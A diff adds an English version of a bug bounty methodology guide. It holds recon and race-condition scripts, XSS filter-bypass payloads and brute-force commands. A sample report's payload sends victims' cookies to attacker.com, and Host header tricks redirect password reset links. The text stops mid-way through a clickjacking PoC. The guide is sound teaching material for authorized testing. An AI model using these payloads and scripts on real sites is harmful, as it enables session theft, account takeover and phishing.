@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # 버그바운티 방법론 — 입문부터 High Severity까지
 
 ## 1. 버그바운티란
@@ -1318,6 +1324,1337 @@ hashid 5f4dcc3b5aa765d61d8327deb882cf99
 python3 hash-identifier.py
 
 # 주요 해시 형식
+$1$   → MD5 (Linux)
+$2a$  → bcrypt
+$5$   → SHA-256 (Linux)
+$6$   → SHA-512 (Linux)
+$y$   → yescrypt
+NTLM  → aad3b435b51404eeaad3b435b51404ee:hash (Windows)
+```
+
+---
+
+<a name="english"></a>
+
+# Bug Bounty Methodology — From Beginner to High Severity
+
+## 1. What is Bug Bounty?
+
+```
+A program where companies pay rewards to external researchers who discover
+vulnerabilities in their services.
+
+Benefits:
+  Researchers → Legally apply hacking skills in real scenarios + earn money
+  Companies   → Discover vulnerabilities that internal teams often miss
+
+Major Platforms:
+  HackerOne   : hackerone.com  (largest platform, Meta, Twitter, Uber, etc.)
+  Bugcrowd    : bugcrowd.com   (NASA, Mastercard, etc.)
+  Intigriti   : intigriti.com  (Europe-focused)
+  Synack       : synack.com    (invite-only, for advanced researchers)
+  Private Programs: Google VRP, Microsoft MSRC, Apple Security Bounty
+```
+
+---
+
+## 2. Getting Started on Each Platform
+
+### Getting Started on HackerOne
+```
+1. Sign up at hackerone.com
+2. Complete Hacker101 CTF (free training + point accumulation)
+   → Accumulate points to receive private program invitations
+3. Start with public programs → Check scope first
+4. Build Reputation → Gain access to private programs
+
+Recommended first targets:
+  - Programs with relatively broad scope
+  - Large enterprises with many assets (many subdomains)
+  - Long-running but active programs
+```
+
+### Reward Guidelines (Reference)
+```
+Critical  (CVSS 9.0-10.0) : $5,000 ~ $50,000+
+High      (CVSS 7.0-8.9)  : $1,000 ~ $10,000
+Medium    (CVSS 4.0-6.9)  : $200  ~ $2,000
+Low       (CVSS 0.1-3.9)  : $50   ~ $500
+Informational             : Usually no reward, acknowledgment only
+```
+
+---
+
+## 3. Reconnaissance (Recon) — Asset Discovery
+
+### 3-1. Subdomain Enumeration
+
+A Python script for enumerating subdomains. Combines Subfinder, Amass results, and DNS brute-force to maximize attack surface discovery.
+
+```python
+#!/usr/bin/env python3
+"""
+Bug Bounty Subdomain Enumeration Automation Pipeline
+Requirements: pip install requests dnspython aiohttp
+External binaries (optional): subfinder, amass, httpx
+"""
+
+from __future__ import annotations
+
+import argparse
+import asyncio
+import json
+import subprocess
+import sys
+import textwrap
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from dataclasses import dataclass, field
+from pathlib import Path
+from typing import Optional
+from urllib.parse import urlparse
+
+import requests
+
+
+# ── crt.sh ───────────────────────────────────────────────────────────────────
+
+def crtsh_enum(domain: str) -> set[str]:
+    url = f"https://crt.sh/?q=%.{domain}&output=json"
+    try:
+        data = requests.get(url, timeout=20).json()
+        subs: set[str] = set()
+        for entry in data:
+            for name in entry.get("name_value", "").splitlines():
+                name = name.strip().lstrip("*.")
+                if name.endswith(domain) and " " not in name:
+                    subs.add(name)
+        return subs
+    except Exception as exc:
+        print(f"[!] crt.sh: {exc}")
+        return set()
+
+
+def subfinder_enum(domain: str) -> set[str]:
+    try:
+        out = subprocess.check_output(
+            ["subfinder", "-d", domain, "-all", "-silent"],
+            stderr=subprocess.DEVNULL, timeout=120,
+        )
+        return {l.strip() for l in out.decode().splitlines() if l.strip()}
+    except FileNotFoundError:
+        print("[!] subfinder not found")
+        return set()
+    except Exception:
+        return set()
+
+
+def amass_enum(domain: str, passive: bool = True) -> set[str]:
+    cmd = ["amass", "enum", "-d", domain] + (["-passive"] if passive else [])
+    try:
+        out = subprocess.check_output(cmd, stderr=subprocess.DEVNULL, timeout=300)
+        return {l.strip() for l in out.decode().splitlines() if l.strip()}
+    except FileNotFoundError:
+        print("[!] amass not found")
+        return set()
+    except Exception:
+        return set()
+
+
+# ── DNS Resolution ────────────────────────────────────────────────────────────
+
+def resolve_a(subdomain: str) -> Optional[list[str]]:
+    try:
+        import dns.resolver
+        r = dns.resolver.Resolver()
+        r.timeout = r.lifetime = 3
+        return [str(a) for a in r.resolve(subdomain, "A")]
+    except Exception:
+        return None
+
+
+# ── HTTP Liveness Check ───────────────────────────────────────────────────────
+
+def check_http(subdomain: str) -> Optional[dict]:
+    """Check HTTP/HTTPS liveness and collect basic information."""
+    for scheme in ("https", "http"):
+        url = f"{scheme}://{subdomain}"
+        try:
+            resp = requests.get(url, timeout=8, allow_redirects=True,
+                                headers={"User-Agent": "Mozilla/5.0"}, verify=False)
+            server = resp.headers.get("Server", "")
+            powered = resp.headers.get("X-Powered-By", "")
+            title_start = resp.text.find("<title>")
+            title_end = resp.text.find("</title>")
+            title = resp.text[title_start + 7:title_end].strip() if title_start != -1 else ""
+            return {
+                "url": resp.url,
+                "status": resp.status_code,
+                "title": title[:80],
+                "server": server,
+                "powered_by": powered,
+                "content_length": len(resp.content),
+            }
+        except Exception:
+            continue
+    return None
+
+
+# ── Subdomain Takeover Detection ──────────────────────────────────────────────
+
+TAKEOVER_FINGERPRINTS = {
+    "github.io": "There isn't a GitHub Pages site here",
+    "s3.amazonaws.com": "NoSuchBucket",
+    "herokuapp.com": "No such app",
+    "azurewebsites.net": "404 Web Site not found",
+    "cloudfront.net": "The request could not be satisfied",
+    "ghost.io": "The thing you were looking for is no longer here",
+    "zendesk.com": "Help Center Closed",
+    "shopify.com": "Sorry, this shop is currently unavailable",
+    "fastly.net": "Fastly error: unknown domain",
+}
+
+
+def check_takeover(subdomain: str) -> Optional[str]:
+    """Check if CNAME points to an unregistered external service."""
+    try:
+        import dns.resolver
+        answers = dns.resolver.resolve(subdomain, "CNAME")
+        cname = str(answers[0].target).rstrip(".")
+        for service, fingerprint in TAKEOVER_FINGERPRINTS.items():
+            if service in cname:
+                try:
+                    resp = requests.get(f"https://{subdomain}", timeout=8, verify=False)
+                    if fingerprint.lower() in resp.text.lower():
+                        return f"TAKEOVER possible: {cname} ({service})"
+                except Exception:
+                    pass
+    except Exception:
+        pass
+    return None
+
+
+# ── Result Management ─────────────────────────────────────────────────────────
+
+@dataclass
+class SubInfo:
+    subdomain: str
+    ips: list[str] = field(default_factory=list)
+    http_info: Optional[dict] = None
+    takeover: Optional[str] = None
+
+    @property
+    def alive(self) -> bool:
+        return self.http_info is not None
+
+
+def run_pipeline(
+    domain: str,
+    use_amass: bool = False,
+    check_alive: bool = True,
+    check_takeovers: bool = True,
+    workers: int = 30,
+) -> list[SubInfo]:
+    all_subs: set[str] = set()
+
+    print("[*] Enumerating via crt.sh...")
+    all_subs |= crtsh_enum(domain)
+    print(f"    crt.sh: {len(all_subs)} results")
+
+    print("[*] Running subfinder...")
+    sf = subfinder_enum(domain)
+    all_subs |= sf
+    print(f"    subfinder: {len(sf)} results | total: {len(all_subs)}")
+
+    if use_amass:
+        print("[*] Running amass (slow)...")
+        am = amass_enum(domain)
+        all_subs |= am
+        print(f"    amass: {len(am)} results | total: {len(all_subs)}")
+
+    print(f"\n[+] After deduplication: {len(all_subs)} subdomains")
+
+    results: list[SubInfo] = []
+
+    # DNS resolution
+    try:
+        import dns.resolver  # noqa
+        print(f"[*] Resolving DNS ({workers} workers)...")
+        with ThreadPoolExecutor(max_workers=workers) as pool:
+            future_map = {pool.submit(resolve_a, s): s for s in sorted(all_subs)}
+            for future in as_completed(future_map):
+                sub = future_map[future]
+                ips = future.result() or []
+                results.append(SubInfo(subdomain=sub, ips=ips))
+    except ImportError:
+        results = [SubInfo(subdomain=s) for s in sorted(all_subs)]
+
+    if check_alive:
+        print(f"[*] Checking HTTP liveness ({workers} workers)...")
+        import urllib3
+        urllib3.disable_warnings()
+        with ThreadPoolExecutor(max_workers=workers) as pool:
+            future_map = {pool.submit(check_http, r.subdomain): r for r in results}
+            for future in as_completed(future_map):
+                rec = future_map[future]
+                rec.http_info = future.result()
+
+    if check_takeovers:
+        print("[*] Checking for subdomain takeover vulnerabilities...")
+        with ThreadPoolExecutor(max_workers=20) as pool:
+            future_map = {pool.submit(check_takeover, r.subdomain): r for r in results}
+            for future in as_completed(future_map):
+                rec = future_map[future]
+                rec.takeover = future.result()
+
+    return sorted(results, key=lambda r: (not r.alive, r.subdomain))
+
+
+def save_results(results: list[SubInfo], out_dir: Path) -> None:
+    out_dir.mkdir(parents=True, exist_ok=True)
+
+    (out_dir / "all.txt").write_text(
+        "\n".join(r.subdomain for r in results), encoding="utf-8"
+    )
+    alive = [r for r in results if r.alive]
+    (out_dir / "alive.txt").write_text(
+        "\n".join(r.subdomain for r in alive), encoding="utf-8"
+    )
+    takeovers = [r for r in results if r.takeover]
+    if takeovers:
+        (out_dir / "takeovers.txt").write_text(
+            "\n".join(f"{r.subdomain}: {r.takeover}" for r in takeovers),
+            encoding="utf-8",
+        )
+        print(f"\n[!] Takeover candidates: {len(takeovers)} → {out_dir}/takeovers.txt")
+
+    json_data = [
+        {
+            "subdomain": r.subdomain,
+            "ips": r.ips,
+            "alive": r.alive,
+            "http": r.http_info,
+            "takeover": r.takeover,
+        }
+        for r in results
+    ]
+    (out_dir / "results.json").write_text(
+        json.dumps(json_data, ensure_ascii=False, indent=2), encoding="utf-8"
+    )
+    print(f"[+] Saved: {out_dir}/ | total: {len(results)} | alive: {len(alive)}")
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(
+        description="Bug Bounty Subdomain Enumeration Automation Pipeline",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog=textwrap.dedent(
+            """
+            Examples:
+              python subdomain_pipeline.py -d target.com
+              python subdomain_pipeline.py -d target.com --amass --no-takeover
+              python subdomain_pipeline.py -d target.com -o ./recon/ -w 50
+            """
+        ),
+    )
+    parser.add_argument("-d", "--domain", required=True)
+    parser.add_argument("--amass", action="store_true", help="include amass (slow)")
+    parser.add_argument("--no-alive", action="store_true", help="skip HTTP liveness check")
+    parser.add_argument("--no-takeover", action="store_true", help="skip takeover check")
+    parser.add_argument("-w", "--workers", type=int, default=30)
+    parser.add_argument("-o", "--output", type=Path, default=None)
+    args = parser.parse_args()
+
+    out_dir = args.output or Path(f"recon_{args.domain}")
+    results = run_pipeline(
+        domain=args.domain,
+        use_amass=args.amass,
+        check_alive=not args.no_alive,
+        check_takeovers=not args.no_takeover,
+        workers=args.workers,
+    )
+
+    for r in results[:20]:
+        status = f"[{r.http_info['status']}] {r.http_info['title'][:40]}" if r.alive else "[dead]"
+        to = f" !! {r.takeover}" if r.takeover else ""
+        print(f"  {r.subdomain:<50} {status}{to}")
+    if len(results) > 20:
+        print(f"  ... and {len(results) - 20} more")
+
+    save_results(results, out_dir)
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### 3-2. URL/Parameter Collection
+
+```bash
+# waybackurls (URLs from web archives)
+echo "target.com" | waybackurls | tee wayback_urls.txt
+
+# gau (multiple sources)
+gau target.com | tee gau_urls.txt
+
+# katana (crawler)
+katana -u https://target.com -d 5 -o katana_urls.txt
+
+# Extract parameters only
+cat wayback_urls.txt gau_urls.txt | grep "?" | qsreplace FUZZ | sort -u > params.txt
+
+# Extract endpoints from JS files
+cat live_subs.txt | getJS | grep "\.js$" | xargs -I{} sh -c 'curl -s {} | python3 -m jsbeautifier | grep -E "api|endpoint|route|path"'
+```
+
+### 3-3. Technology Stack Identification
+
+Use whatweb to identify the technology stack of a target website. CMS, framework, and server software information helps research known vulnerabilities for those technologies.
+
+```bash
+# whatweb
+whatweb https://target.com -a 3
+
+# wappalyzer CLI
+npx wappalyzer https://target.com
+
+# nuclei technology detection
+nuclei -u https://target.com -t technologies/ -o tech.txt
+
+# HTTP response header analysis
+curl -I https://target.com 2>/dev/null | grep -E "Server|X-Powered|X-Framework|Via"
+```
+
+---
+
+## 4. Vulnerability Discovery Strategy
+
+### 4-1. OWASP Top 10 Checklist
+
+```
+Quick checks for each asset:
+
+□ Broken Access Control
+  - Direct access to /admin, /dashboard, /api/users/{id}
+  - Replace user IDs (IDOR: Insecure Direct Object Reference)
+  - Access privileged functions with a regular account
+
+□ SQL Injection
+  - Insert ' in parameters → check for errors
+  - Sort/search parameters (ORDER BY, search terms)
+  - JSON parameters, headers (X-Forwarded-For, User-Agent)
+
+□ XSS (Cross-Site Scripting)
+  - Search terms, comments, profile names, error messages
+  - DOM-based: URL fragment (#), location.hash
+  - Filter bypass: SVG, event handlers, base64
+
+□ Authentication/Session Vulnerabilities
+  - Password reset logic (token reuse, predictable tokens)
+  - 2FA bypass (race condition, reuse)
+  - JWT: alg:none, HS256→RS256 confusion, secret key brute force
+
+□ SSRF
+  - Features that accept URL input (thumbnails, webhooks, PDF generation)
+  - http://169.254.169.254/ cloud metadata
+  - Internal network scanning
+
+□ File Upload
+  - Content-Type tampering, extension filter bypass
+  - Guess upload path → execute web shell
+
+□ IDOR (Broken Access Control detail)
+  - Change numeric ID to another number
+  - Determine where UUIDs are leaked
+  - API endpoints: GET /api/orders/12345
+```
+
+### 4-2. IDOR — Most Common Bug Bounty Vulnerability
+
+```
+IDOR (Insecure Direct Object Reference):
+A vulnerability where another user's resources can be accessed directly.
+
+Discovery method:
+1. Create 2 accounts (Account A, Account B)
+2. Log in as Account A → find your resource URL
+   Example: GET /api/v1/users/1001/profile
+3. Access Account A's URL using Account B's session
+   → If accessible, it's IDOR!
+
+Good places to look:
+- Profile edit/view
+- Order history, payment information
+- File downloads
+- API endpoints (numeric ID, UUID)
+- Email inbox
+
+Automation:
+# Autorize (Burp Suite extension)
+# Set up two sessions → automatically check authorization for every request
+```
+
+### 4-3. XSS — Filter Bypass Strategies
+
+```
+Basic testing:
+<script>alert(1)</script>
+"><script>alert(1)</script>
+'><img src=x onerror=alert(1)>
+
+Filter bypass:
+# When HTML tags are filtered
+<svg onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<details open ontoggle=alert(1)>
+<video autoplay onloadstart=alert(1) src=x>
+
+# When 'script' keyword is filtered
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<svg><use href="data:image/svg+xml;base64,...#x"/></svg>
+
+# XSS firewall bypass
+<scRiPt>alert(1)</scRiPt>
+<script/x>alert(1)</script>
+<script>/*</script><script>*/alert(1)</script>
+
+# DOM XSS detection
+# Use Burp DOM Invader
+# Inject canary strings and track through JS source
+```
+
+### 4-4. Password Reset Vulnerabilities
+
+```
+Vulnerable patterns:
+
+[1] Token reuse
+   - Can you reset the password again using the old token after resetting?
+
+[2] Non-expiring tokens
+   - Old tokens that never expire
+
+[3] Race condition
+   - Multiple simultaneous reset requests → same token on multiple accounts?
+
+[4] Host Header Injection
+   POST /reset-password HTTP/1.1
+   Host: attacker.com
+   → Email sends link to attacker.com
+
+[5] Predictable tokens
+   - Time-based (timestamp MD5)
+   - User ID-based
+```
+
+---
+
+## 5. Burp Suite Bug Bounty Configuration
+
+### 5-1. Essential Extension Plugins
+
+```
+Install from BApp Store:
+
+1. Autorize          → Automate IDOR/authorization checks
+2. Param Miner       → Auto-discover hidden parameters
+3. Retire.js         → Detect vulnerable JS libraries
+4. J2EEScan          → Java-specific vulnerabilities
+5. Active Scan++     → Enhanced active scanning
+6. Reflected Parameters → Track reflected parameters
+7. Error Message Checks → Information leakage in error messages
+8. Software Vulnerability Scanner → CVE mapping
+9. Turbo Intruder    → High-speed brute forcer (race conditions)
+10. Logger++         → Log all requests
+```
+
+### 5-2. Scope Configuration
+
+Always verify the exact scope of a bug bounty program before testing. Testing out-of-scope systems can result in legal issues. Most platforms clearly distinguish In-scope from Out-of-scope targets.
+
+```
+Target → Scope settings:
+1. Add → Add target domain
+2. Subdomain wildcard: .*\.target\.com$
+3. Restrict Spider and Scanner to in-scope only
+
+Important: Never send requests outside scope!
+→ Violates HackerOne rules → Risk of account suspension
+```
+
+### 5-3. Race Condition Testing with Turbo Intruder
+
+A Turbo Intruder script for exploiting race condition vulnerabilities. Tests concurrent request handling errors such as duplicate coupon use and overdraft.
+
+```python
+# race_condition_coupon.py — Turbo Intruder script
+# Tests duplicate coupon use / duplicate point accumulation
+#
+# Usage: Select request in Burp Suite Repeater
+#        Extensions > Turbo Intruder > Send to Turbo Intruder
+#        Paste this script and click Attack
+#
+# gate method: queues all requests then sends them simultaneously (HTTP/1 pipeline)
+
+def queueRequests(target, wordlists):
+    engine = RequestEngine(
+        endpoint=target.endpoint,
+        concurrentConnections=30,   # concurrent connections (higher = more race effect)
+        requestsPerConnection=1,
+        pipeline=False,             # set True for HTTP/2 environments
+        engine=Engine.THREADED,
+    )
+
+    # gate method: queue all requests then release simultaneously
+    for i in range(30):
+        engine.queue(target.req, gate='race1')
+
+    engine.openGate('race1')
+    engine.complete(timeout=20)
+
+
+def handleResponse(req, interesting):
+    # Add only successful responses (200, "success", "applied", etc.) to the table
+    if req.status == 200 and any(
+        kw in req.response.lower()
+        for kw in ('success', 'applied', 'redeemed', 'credited', 'ok')
+    ):
+        table.add(req)
+```
+
+```python
+#!/usr/bin/env python3
+"""
+Race Condition Test — standalone version based on requests
+Requirements: pip install requests
+"""
+
+from __future__ import annotations
+
+import argparse
+import json
+import sys
+import textwrap
+import time
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from typing import Any
+
+import requests
+
+
+def race_test(
+    url: str,
+    method: str = "POST",
+    headers: dict[str, str] | None = None,
+    body: str | None = None,
+    count: int = 30,
+    workers: int = 30,
+    success_codes: list[int] | None = None,
+    success_keywords: list[str] | None = None,
+) -> list[dict[str, Any]]:
+    """Send concurrent requests to check for race condition vulnerabilities."""
+
+    success_codes = success_codes or [200, 201]
+    success_keywords = success_keywords or ["success", "ok", "applied", "credited"]
+    default_headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
+    if headers:
+        default_headers.update(headers)
+
+    wins: list[dict[str, Any]] = []
+
+    def send_request(idx: int) -> dict[str, Any]:
+        try:
+            kwargs: dict[str, Any] = {
+                "headers": default_headers,
+                "timeout": 15,
+                "verify": False,
+            }
+            if body:
+                kwargs["data"] = body
+            resp = getattr(requests, method.lower())(url, **kwargs)
+            text_lower = resp.text.lower()
+            hit = resp.status_code in success_codes and any(
+                kw in text_lower for kw in success_keywords
+            )
+            return {
+                "idx": idx,
+                "status": resp.status_code,
+                "length": len(resp.content),
+                "time_ms": int(resp.elapsed.total_seconds() * 1000),
+                "hit": hit,
+                "snippet": resp.text[:100],
+            }
+        except requests.RequestException as exc:
+            return {"idx": idx, "error": str(exc), "hit": False}
+
+    print(f"[*] Race condition test: {count} concurrent requests → {url}")
+    with ThreadPoolExecutor(max_workers=workers) as pool:
+        futures = [pool.submit(send_request, i) for i in range(count)]
+        for future in as_completed(futures):
+            result = future.result()
+            if result.get("hit"):
+                wins.append(result)
+
+    return wins
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(
+        description="Race condition vulnerability test",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog=textwrap.dedent(
+            """
+            Examples:
+              # Test duplicate coupon application
+              python race_test.py -u https://target.com/api/coupon/apply \\
+                  -X POST -d '{"code":"SAVE10"}' \\
+                  -H 'Authorization: Bearer TOKEN' --count 30
+
+              # OTP brute-force race
+              python race_test.py -u https://target.com/api/verify-otp \\
+                  -X POST -d '{"otp":"123456"}' --count 20
+            """
+        ),
+    )
+    parser.add_argument("-u", "--url", required=True)
+    parser.add_argument("-X", "--method", default="POST")
+    parser.add_argument("-d", "--data", default=None, help="request body")
+    parser.add_argument(
+        "-H", "--header", action="append", default=[],
+        metavar="KEY:VALUE", help="additional headers (can be used multiple times)",
+    )
+    parser.add_argument("--count", type=int, default=30, help="number of concurrent requests")
+    parser.add_argument("--workers", type=int, default=30)
+    parser.add_argument(
+        "--keywords", nargs="+",
+        default=["success", "ok", "applied", "credited"],
+        help="success keywords",
+    )
+    args = parser.parse_args()
+
+    headers: dict[str, str] = {}
+    for h in args.header:
+        if ":" in h:
+            k, v = h.split(":", 1)
+            headers[k.strip()] = v.strip()
+
+    import urllib3
+    urllib3.disable_warnings()
+
+    wins = race_test(
+        url=args.url,
+        method=args.method,
+        headers=headers or None,
+        body=args.data,
+        count=args.count,
+        workers=args.workers,
+        success_keywords=args.keywords,
+    )
+
+    print(f"\n[+] Successful responses: {len(wins)} / {args.count}")
+    if len(wins) > 1:
+        print("[!] Suspected race condition! Multiple successful responses detected.")
+        for w in wins:
+            print(f"    [{w['idx']}] {w.get('status')} | {w.get('length')}B | {w.get('snippet', '')[:60]}")
+    elif len(wins) == 0:
+        print("[*] Race condition not detected — try more concurrent requests or different endpoints")
+    else:
+        print("[*] Single success — normal behavior")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 6. Report Writing — How to Maximize Acceptance
+
+### 6-1. Good Report Structure
+
+Standard structure for a bug bounty report. Clearly describing the vulnerability summary, reproduction steps, impact, PoC, and fix recommendations leads to higher rewards.
+
+```markdown
+## Vulnerability Summary
+[Vulnerability Type] in [Component] — [One-line impact summary]
+Example: Stored XSS in /profile/bio allows Session Hijacking
+
+## Severity: High (CVSS 3.1: 8.1)
+
+## Impact
+- Attacker can steal victim's session cookie to take over their account
+- If an admin account is compromised, the entire system is at risk
+
+## Vulnerable Endpoint
+POST /api/v1/profile/update
+Parameter: bio
+
+## Steps to Reproduce
+1. Log in as the victim account
+2. Edit profile → Enter the following in the bio field:
+   <img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
+3. Save changes
+4. When another user visits the profile, cookies are automatically sent
+
+## PoC
+[Attach screenshot or video]
+Cookie capture server log:
+[2024-01-15 10:23:45] GET /?c=sessionid=abc123def456
+
+## Remediation
+Encode HTML special characters when saving the bio field:
+& → &amp;  < → &lt;  > → &gt;  " → &quot;
+
+## References
+- OWASP: https://owasp.org/www-community/attacks/xss/
+- CWE-79: Improper Neutralization of Input
+```
+
+### 6-2. How to Avoid Rejection
+
+```
+Common rejection reasons:
+
+✗ "Self-XSS" — only affects your own account
+  → Must impact other users
+
+✗ "Missing security header" (informational)
+  → Must prove actual exploitability
+
+✗ "Rate limiting not implemented"
+  → Need to specify actual attack scenario and impact
+
+✗ "Out of scope"
+  → Always check scope first
+
+✗ "Already known" (duplicate)
+  → Search for similar reports before submitting
+
+✗ Not reproducible
+  → Provide detailed step-by-step instructions, attach screenshots/video
+```
+
+---
+
+## 7. Automation Tool Collection
+
+Nuclei is a YAML template-based tool for quickly scanning web vulnerabilities. Using the public template repository maintained by ProjectDiscovery, you can detect CVEs, misconfigurations, and exposed files at scale.
+
+```bash
+# Nuclei — multi-purpose vulnerability scanner (template-based)
+nuclei -u https://target.com -t cves/ -o nuclei_cves.txt
+nuclei -u https://target.com -t exposures/ -severity high,critical
+nuclei -l live_subs.txt -t vulnerabilities/ -rate-limit 50
+
+# ffuf — web fuzzer
+# Directory fuzzing
+ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt \
+     -u https://target.com/FUZZ -mc 200,301,302 -o dirs.json
+
+# Parameter fuzzing
+ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
+     -u "https://target.com/page?FUZZ=test" -mc 200 -fs [baseline_size]
+
+# Subdomain VHOST
+ffuf -w subdomains.txt -H "Host: FUZZ.target.com" \
+     -u https://target.com -mc 200 -fs [baseline_size]
+
+# dalfox — XSS automation
+dalfox url "https://target.com/search?q=FUZZ"
+dalfox file params.txt --deep-domxss
+
+# sqlmap (authorized targets only)
+sqlmap -u "https://target.com/page?id=1" --dbs --batch --level=3
+
+# gitleaks — GitHub secrets detection
+gitleaks detect --source /path/to/repo
+gitleaks github --org=target-company
+
+# trufflehog
+trufflehog git https://github.com/target-org/target-repo
+```
+
+---
+
+## 8. Bug Bounty Monetization Strategy
+
+```
+Beginner strategy:
+1. Complete HackerOne Hacker101 CTF → earn private program invitations
+2. Target new programs with low competition
+3. Prioritize programs with broad scope
+4. Focus on poorly maintained subdomains
+
+Intermediate strategy:
+1. Build automation pipeline (amass → httpx → nuclei)
+2. Analyze program history (identify past report patterns)
+3. Specialize in specific technology stacks (GraphQL, OAuth, JWT, etc.)
+4. Chain vulnerabilities to elevate to High/Critical
+
+Chaining examples:
+SSRF (Medium) + AWS metadata access (High) + IAM credential theft (Critical)
+Information disclosure (Low) + Account takeover chain (High)
+```
+
+---
+
+## 8-2. CMS Hacking Methodology (Bug Bounty Perspective)
+
+### WordPress Vulnerability Detection
+
+WPScan enumerates vulnerable plugins, themes, and user accounts on WordPress sites. As the most widely used CMS, it is frequently targeted in bug bounties.
+
+```bash
+# WPScan — WordPress-specific vulnerability scanner
+wpscan --url https://target.com
+wpscan --url https://target.com --enumerate p  # enumerate plugins
+wpscan --url https://target.com --enumerate u  # enumerate users
+wpscan --url https://target.com -P wordlist.txt --username admin  # password brute-force
+
+# Check plugin versions → search ExploitDB
+wpscan --url https://target.com --enumerate p --plugins-detection aggressive
+
+# Check XML-RPC vulnerabilities
+curl -X POST https://target.com/xmlrpc.php \
+  -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'
+# If XML-RPC is enabled → can be used for brute-force, SSRF, etc.
+```
+
+### Drupal / Joomla Vulnerability Detection
+
+Droopescan enumerates the version and plugins of Drupal/Joomla CMS. Check for known RCE vulnerabilities such as Drupalgeddon.
+
+```bash
+# Droopescan — Drupal scanner
+droopescan scan drupal -u https://target.com
+
+# Joomscan — Joomla scanner
+joomscan -u https://target.com
+
+# Common CMS vulnerability discovery (Nuclei)
+nuclei -u https://target.com -tags cms,wordpress,drupal,joomla
+```
+
+### 1-Day Vulnerability Exploitation Methodology
+```
+1. Identify technology stack
+   → Wappalyzer, WhatWeb, HTTP response header analysis
+
+2. Determine version
+   → Check paths: /readme.txt, /CHANGELOG.txt, /admin/modules
+   → X-Powered-By header, Generator meta tag in HTTP response
+
+3. Search for vulnerabilities
+   → searchsploit "[CMS name] [version]"
+   → https://nvd.nist.gov/vuln/search
+   → https://www.exploit-db.com/
+   → GitHub: site:github.com "CVE-20XX-XXXXX"
+
+4. Obtain and test PoC
+   → Search for PoC code on GitHub (beware of untrusted PoCs!)
+   → Verify in a local test environment first
+
+5. 1-day tracking strategy
+   → Monitor ExploitDB RSS, Twitter threat feeds
+   → Quickly scan targets after new CVE announcement (window before patching)
+```
+
+---
+
+## 8-3. GitHub / Subdomain Takeover
+
+Detects subdomain takeover vulnerabilities. An attacker can register subdomains whose CNAME points to a deleted external service.
+
+```bash
+# Subdomain takeover vulnerability detection
+# When CNAME points to an external service but is not registered there
+
+# Check for vulnerable patterns
+dig sub.target.com CNAME
+# → CNAME: some-name.github.io (GitHub Pages, unregistered)
+# → CNAME: bucket.s3.amazonaws.com (S3, not created)
+# → CNAME: target.herokuapp.com (Heroku, unregistered)
+
+# Automated detection tools
+subjack -w subdomains.txt -t 100 -o takeover_results.txt
+subzy run --targets subdomains.txt
+
+# GitHub Pages takeover (when CNAME is unregistered)
+# 1. Create a GitHub account
+# 2. Create a repository with the same name
+# 3. Enable GitHub Pages
+# 4. Target subdomain now points to attacker's page
+
+# S3 bucket takeover
+# 1. Create an S3 bucket with the same bucket name (same region)
+# 2. Upload a phishing page
+```
+
+---
+
+## 9. Host Header Injection
+
+### Attack Principle
+```
+Occurs when the server blindly trusts and processes the HTTP Host header
+→ Can be abused for password reset links, cache poisoning, SSRF, etc.
+```
+
+### Host Header Injection Techniques
+
+Manipulate the password reset link to point to an attacker's domain via Host header injection. The link included in the email will point to the attacker's server.
+
+```http
+# 1. Password reset link manipulation
+POST /reset-password HTTP/1.1
+Host: attacker.com         ← tampered
+
+Link sent in email:
+https://attacker.com/reset?token=abc123  ← contains attacker domain
+
+# 2. Using X-Forwarded-Host
+POST /reset-password HTTP/1.1
+Host: target.com
+X-Forwarded-Host: attacker.com   ← abusing proxy header
+
+# 3. Port number injection
+Host: target.com:@attacker.com
+
+# 4. Subdomain addition
+Host: attacker.com.target.com
+
+# 5. Duplicate Host header
+Host: target.com
+Host: attacker.com   ← second Host may take precedence
+```
+
+### Cache Poisoning (Host Header → Web Cache Poisoning)
+
+Web cache poisoning attack via Host header. If a CDN caches the tampered response, other users are also affected — an amplification effect.
+
+```bash
+# When a CDN/reverse proxy reflects the Host header in the response and caches it
+GET / HTTP/1.1
+Host: target.com
+X-Forwarded-Host: evil.com"><script>alert(1)</script>
+
+# If the response is cached → other users are also affected by XSS
+```
+
+### Host Header Injection Defense
+
+Defend against Host header injection using an allowlist of permitted hosts. Always validate when generating links for password resets and similar features.
+
+```python
+# Flask: allowed host allowlist
+ALLOWED_HOSTS = ['target.com', 'www.target.com']
+
+@app.before_request
+def check_host():
+    if request.host not in ALLOWED_HOSTS:
+        abort(400)
+
+# Django: ALLOWED_HOSTS setting
+ALLOWED_HOSTS = ['target.com', 'www.target.com']
+
+# Hard-code password reset URL as environment variable
+RESET_BASE_URL = 'https://target.com/reset'
+```
+
+---
+
+## 10. Clickjacking
+
+### Attack Principle
+```
+Place the victim site in a transparent iframe overlaid on a malicious page
+to trick the user into clicking on it unknowingly.
+
+Attack flow:
+1. Attacker → create malicious page
+2. Embed target.com as a transparent iframe in the page
+3. Lure victim to the malicious page
+4. When victim clicks a button, target.com action is performed
+   (fund transfer, settings change, account deletion, etc.)
+```
+
+### Clickjacking PoC
+
+A PoC page demonstrating a Clickjacking vulnerability. A page without X-Frame-Options or CSP frame-ancestors headers is embedded in an iframe to hijack clicks.
+
+```html
+<!DOCTYPE html>
+<html>
+<head>
+  <style>
+    #target-frame {
+      opacity: 0.0;       /* fully transparent (real attack) */
+      /* opacity: 0.5;    semi-transparent for demonstration */
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 2;
+    }
+    #decoy-content {
+      position: absolute;
+      top: 100px;
+      left: 200px;
+      z-index: 1;
